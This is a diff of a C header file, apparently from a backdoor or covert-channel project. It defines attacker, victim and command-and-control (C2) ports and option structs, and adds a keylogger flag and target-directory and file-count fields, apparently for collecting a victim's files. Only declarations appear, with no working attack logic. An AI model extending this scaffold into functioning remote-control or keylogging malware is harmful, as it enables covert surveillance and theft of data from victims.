@@ -44,10 +44,10 @@
 #include <unistd.h>
 #include "extern.h"
 
-#define ATTACKER_PORT 52000
-#define DEFAULT_PORT 53000
+#define DEFAULT_TCP_PORT 52000
+#define DEFAULT_UDP_PORT 53000
 #define VICTIM_PORT 54000
-#define CVC_PORT 55000
+#define CNC_PORT 55000
 
 #define DEFAULT_COUNT 10000
 #define S_ARR_SIZE 64
@@ -64,35 +64,36 @@
 struct options_attacker {
     char victim_ip[INET_ADDRSTRLEN];
     char my_ip[INET_ADDRSTRLEN];
-    char cvc_ip[INET_ADDRSTRLEN];
+    char cnc_ip[INET_ADDRSTRLEN];
     char victim_instruction[64];
-    int attacker_socket_udp;
-    int attacker_socket_tcp;
-    bool cvc;
+    char target_directory[64];
+    int tcp_socket;
+    int udp_socket;
+    int cnc_socket;
+    bool cnc;
 };
 
 
 struct options_victim {
     char attacker_ip[INET_ADDRSTRLEN];
     char my_ip[INET_ADDRSTRLEN];
-    char cvc_ip[INET_ADDRSTRLEN];
-    int victim_socket;
-    int cvc_socket;
+    char cnc_ip[INET_ADDRSTRLEN];
+    int victim_udp_socket;
+    int victim_tcp_socket;
+    int cnc_socket;
+    int attacker_socket;
     uint16_t attacker_port;
     char received_buffer[S_ARR_SIZE];
     char instruction[S_ARR_SIZE];
     char sending_buffer[OUTPUT_SIZE];
-    struct sockaddr_in cvc_addr;
+    char target_directory[64];
+    int file_count;
+    struct sockaddr_in cnc_addr;
     bool ip_flag;
     bool keylogger;
-    bool cvc;
+    bool cnc;
+    bool target;
 };
-
-typedef struct recv_udp {
-    struct iphdr ip;
-    struct udphdr udp;
-} recv_pkt;
-
 
 
 void check_root_user(void);
